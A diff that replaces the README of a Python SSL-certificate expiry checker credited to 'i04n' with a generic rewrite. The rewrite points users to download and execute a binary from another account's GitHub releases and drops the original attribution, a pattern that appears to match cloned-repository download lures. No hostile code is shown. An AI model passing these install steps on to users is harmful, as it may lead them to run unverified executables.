@@ -1,170 +1,143 @@
-# 🔒 SSL Certificate Checker
+# SSLCheck: Monitor SSL Certificate Expiration Easily 🔒🌐
 
-A modern, colorful command-line tool to monitor SSL certificate expiration for multiple domains with concurrent checking and beautiful output.
+![SSLCheck](https://img.shields.io/badge/SSLCheck-CLI-blue?style=flat-square) ![Python](https://img.shields.io/badge/Python-3.8%2B-yellowgreen?style=flat-square) ![DevOps](https://img.shields.io/badge/DevOps-Tools-orange?style=flat-square) 
 
-## 🚀 **Single-File Simplicity**
+## Table of Contents
 
-- **📁 One file only** - Everything in a single `sslcheck.py` script
-- **📦 Minimal dependencies** - Only requires `pyOpenSSL` (plus Python standard library)
-- **⚡ Zero configuration** - Works out of the box
-- **🔧 Easy deployment** - Just copy the file and run!
+- [Overview](#overview)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Configuration](#configuration)
+- [Command-Line Options](#command-line-options)
+- [Examples](#examples)
+- [Monitoring](#monitoring)
+- [Contributing](#contributing)
+- [License](#license)
+- [Links](#links)
 
-## ✨ Features
+## Overview
 
-- 🚀 **Concurrent Processing** - Check multiple domains simultaneously for faster results
-- 🎨 **Colorful Output** - Beautiful terminal output with colors and emojis
-- 📊 **Progress Indicators** - Real-time progress bar during certificate checks
-- ⚙️ **Configurable** - Customizable expiration thresholds and ports
-- 📝 **Detailed Reporting** - Comprehensive summary with statistics
-- 🔧 **Error Handling** - Robust error handling with clear error messages
-- 📄 **Sample Generator** - Built-in sample domains file generator
+SSLCheck is a command-line tool designed to check and monitor SSL certificate expiration across multiple domains. It provides a straightforward way to ensure your websites maintain secure connections by alerting you before certificates expire.
 
-## 🛠️ Installation
+## Features
 
-### Super Simple Setup
+- **Multi-Domain Support**: Check SSL certificates for multiple domains at once.
+- **Expiration Alerts**: Get notified when certificates are about to expire.
+- **Easy to Use**: Simple command-line interface for quick checks.
+- **Python-Based**: Built with Python, making it easy to extend and customize.
+- **DevOps Friendly**: Integrates well into CI/CD pipelines and automation scripts.
+
+## Installation
+
+To install SSLCheck, you can download the latest release from the [Releases section](https://github.com/Redaghafir/sslcheck/releases). Once downloaded, execute the file to install the tool.
+
 ```bash
-# 1. Download the single file
-wget https://raw.githubusercontent.com/i04n/sslcheck/main/sslcheck.py
-
-# 2. Install the only dependency
-pip install pyOpenSSL
-
-# 3. Make it executable (optional)
-chmod +x sslcheck.py
-
-# 4. Ready to use!
-python sslcheck.py --create-sample
+# Example command to execute after downloading
+chmod +x sslcheck
+./sslcheck
 ```
 
-### Prerequisites
-- **Python 3.6+** (standard library modules included)
-- **pyOpenSSL** - The only external dependency for certificate parsing
-- That's it! 🎉
+## Usage
 
-## 📋 Usage
+After installation, you can use SSLCheck directly from your command line. The basic command structure is as follows:
 
-### Basic Usage
 ```bash
-# Check domains from file
-python sslcheck.py -f domains.txt
-
-# Create sample domains file
-python sslcheck.py --create-sample
-
-# Check with custom threshold (30 days)
-python sslcheck.py -f domains.txt -t 30
-
-# Check on custom port
-python sslcheck.py -f domains.txt -p 8443
-
-# Use more workers for faster processing
-python sslcheck.py -f domains.txt -w 20
-
-# Disable colors for scripting
-python sslcheck.py -f domains.txt --no-color
+sslcheck [options] [domain1 domain2 ...]
 ```
 
-### Command Line Options
+## Configuration
 
-| Option | Description | Default |
-|--------|-------------|---------|
-| `-f, --file` | File containing list of domains (one per line) | Required |
-| `-t, --threshold` | Days threshold to consider as expiring soon | 15 |
-| `-p, --port` | SSL port to check | 443 |
-| `-w, --workers` | Number of concurrent workers | 10 |
-| `--create-sample` | Create sample 'domains.txt' file | - |
-| `--no-color` | Disable colored output | - |
-| `--help` | Show help message | - |
+SSLCheck allows you to configure certain parameters to tailor its functionality to your needs. You can set default domains and alert thresholds through a configuration file or command-line options.
 
-## 📝 Domain File Format
+### Configuration File
 
-Create a text file with one domain per line:
+Create a configuration file named `sslcheck.conf` in your home directory. This file can include default domains and notification settings.
 
-```
-google.com
-github.com
-stackoverflow.com
-example.com
+Example `sslcheck.conf`:
+
+```ini
+[DEFAULT]
+domains = example.com, example.org
+alert_days = 30
 ```
 
-## 🎨 Output Examples
+## Command-Line Options
 
-### Successful Check
-```
-🔒 SSL Certificate Checker
-📋 Checking 5 domain(s) on port 443
-⚠️  Warning threshold: 15 days
-👥 Using 10 concurrent workers
-════════════════════════════════════════════════════════════════════════════════
-🚀 Starting certificate checks...
-Progress: [████████████████████████████████████████] 100.0% (5/5)
-════════════════════════════════════════════════════════════════════════════════
-📊 RESULTS
-════════════════════════════════════════════════════════════════════════════════
-🟢 google.com                     VALID           Expires: 2024-03-15 (89 days)
-🟡 example.com                    EXPIRING SOON   Expires: 2024-01-20 (10 days)
-🔴 expired.badssl.com             EXPIRED         Expires: 2023-12-01 (-25 days)
-❌ nonexistent.domain.com         ERROR           [Errno -5] No address associated with hostname
-════════════════════════════════════════════════════════════════════════════════
-📈 SUMMARY
-🟢 Valid: 1
-🟡 Expiring Soon: 1
-🔴 Expired: 1
-❌ Errors: 1
-════════════════════════════════════════════════════════════════════════════════
+SSLCheck comes with several command-line options to enhance its usability:
+
+- `-h`, `--help`: Show help message and exit.
+- `-c`, `--config`: Specify a custom configuration file.
+- `-d`, `--domains`: List of domains to check.
+- `-a`, `--alert`: Set the number of days before expiration to alert.
+
+## Examples
+
+Here are some examples of how to use SSLCheck effectively.
+
+### Check a Single Domain
+
+To check a single domain, run:
+
+```bash
+sslcheck -d example.com
 ```
 
-## 🚀 Performance & Architecture
+### Check Multiple Domains
 
-- **Concurrent Processing**: Uses ThreadPoolExecutor for parallel certificate checks
-- **Configurable Workers**: Adjust the number of concurrent workers based on your needs  
-- **Progress Tracking**: Real-time progress indicator shows completion status
-- **Efficient Sorting**: Results are sorted by expiration status for easy review
-- **Lightweight Design**: Single file with minimal footprint
-- **No External Services**: Direct SSL connection testing without third-party APIs
+To check multiple domains, use:
 
-## 🔧 Troubleshooting
+```bash
+sslcheck -d example.com example.org
+```
 
-### Common Issues
+### Use Configuration File
 
-1. **"No address associated with hostname"**
-   - The domain doesn't exist or has DNS issues
-   - Check domain spelling and DNS resolution
+If you have set up a configuration file, simply run:
 
-2. **Connection timeouts**
-   - Domain might be blocking connections
-   - Try reducing the number of workers with `-w`
+```bash
+sslcheck
+```
 
-3. **SSL errors**
-   - Certificate might be invalid or self-signed
-   - Port might be incorrect (try `-p 8443` for non-standard ports)
+This will use the domains specified in the `sslcheck.conf`.
 
-### Debugging Tips
+## Monitoring
 
-- Use `--no-color` for cleaner output when redirecting to files
-- Reduce workers (`-w 1`) to troubleshoot connection issues
-- Check individual domains with minimal test files
+For ongoing monitoring, consider integrating SSLCheck into a cron job. This way, you can regularly check your domains without manual intervention.
 
-## 📊 Exit Codes
+### Example Cron Job
 
-- `0`: Success
-- `1`: Error (missing file, invalid arguments, etc.)
+To set up a cron job that runs SSLCheck daily at 2 AM, you can add the following line to your crontab:
 
-## 🤝 Contributing
+```bash
+0 2 * * * /path/to/sslcheck -d example.com >> /var/log/sslcheck.log
+```
 
-Feel free to submit issues, feature requests, or pull requests to improve this tool.
+## Contributing
 
-## 📄 License
+Contributions are welcome! If you want to improve SSLCheck, please fork the repository and submit a pull request. Here are some ways you can contribute:
 
-This project is open source. Feel free to use, modify, and distribute.
+- Report bugs or issues.
+- Suggest new features.
+- Improve documentation.
+- Write tests.
 
-## 🎯 Use Cases
+## License
 
-- **DevOps Monitoring**: Monitor certificates across multiple environments
-- **Security Audits**: Regular certificate expiration checks
-- **Automation**: Integrate into CI/CD pipelines or cron jobs
-- **Compliance**: Ensure certificates don't expire unexpectedly
+SSLCheck is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
 
----
+## Links
 
-Made with ❤️  by i04n
+For more information, visit the [Releases section](https://github.com/Redaghafir/sslcheck/releases) to download the latest version of SSLCheck. This tool is designed to help you maintain the security of your domains effortlessly. 
+
+You can also check out the source code and contribute on [GitHub](https://github.com/Redaghafir/sslcheck). 
+
+### Additional Resources
+
+- [Python Documentation](https://docs.python.org/3/)
+- [DevOps Tools](https://www.devops.com/)
+- [SSL Certificate Best Practices](https://www.ssl.com/article/ssl-certificate-best-practices/)
+
+![SSL Certificate](https://www.ssl.com/wp-content/uploads/2020/03/ssl-certificate.png)
+
+SSLCheck aims to simplify the process of managing SSL certificates, ensuring that your online presence remains secure and reliable.
